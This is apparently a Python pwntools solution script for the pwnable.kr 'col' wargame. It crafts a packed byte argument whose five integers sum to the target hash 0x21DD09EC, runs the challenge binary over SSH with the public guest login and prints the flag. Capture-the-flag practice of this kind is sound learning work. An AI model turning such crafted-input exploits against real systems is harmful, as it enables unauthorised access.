from pwn import *

def main():
    # processing parts of the hashcode into a packed binary 
    hashcode = int("21DD09EC",16)
    hashcode_part = int(hashcode / 5)
    hashcode_reminder = hashcode - int(hashcode_part) * 4
    packed_hashcode_part = struct.pack("<i",hashcode_part)
    packed_hashcode_reminder = struct.pack("<i",hashcode_reminder)
    packed_final_hashcode = 4 * packed_hashcode_part + packed_hashcode_reminder
    # creating ssh session and exploitng col program using the previous packed binary 
    # you can also use "sys.stdout.buffer.write(b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06')"
    # menually from the ssh shell
    session = ssh("col","pwnable.kr",2222,"guest")
    exploit_process = session.process(executable='./col',argv=['col',packed_final_hashcode])
    # getting and printing flag from ssh session
    flag = exploit_process.recv()
    print("flag: " + str(flag))
    exploit_process.close()
    session.close()

if __name__=='__main__':
    main()